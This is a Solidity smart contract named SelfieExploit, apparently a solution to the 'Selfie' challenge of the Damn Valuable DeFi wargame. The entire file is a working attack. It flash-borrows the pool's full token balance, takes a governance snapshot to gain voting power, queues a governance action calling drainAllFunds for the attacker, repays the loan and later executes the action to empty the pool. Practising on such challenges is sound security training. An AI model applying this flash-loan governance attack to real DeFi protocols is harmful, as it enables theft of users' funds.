pragma solidity ^0.6.0;

import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableTokenSnapshot.sol";

interface IFlashLoanPool {
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}

interface IGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}
contract SelfieExploit {
    address flashpool;
    address governance;
    address token;
    address attacker;

    uint256 public id;
    constructor(address _flashpool, address _governance, address _token, address _attacker ) public {
        flashpool = _flashpool;
        governance = _governance;
        token = _token;
        attacker = _attacker;
    }

    function borrowAndPropose() external returns(bool) {
        uint256 amount = DamnValuableTokenSnapshot(token).balanceOf(flashpool);
        IFlashLoanPool(flashpool).flashLoan(amount);
    }

    function receiveTokens(address _token,uint256 _amount) external {
        DamnValuableTokenSnapshot(token).snapshot();
        bytes memory payload = abi.encodeWithSignature("drainAllFunds(address)", attacker);
        id = IGovernance(governance).queueAction(flashpool, payload, 0);
        IERC20(_token).transfer(flashpool, _amount);
    }

    function executeMaliciousProposal() external {
        IGovernance(governance).executeAction(id);
    }
    
}
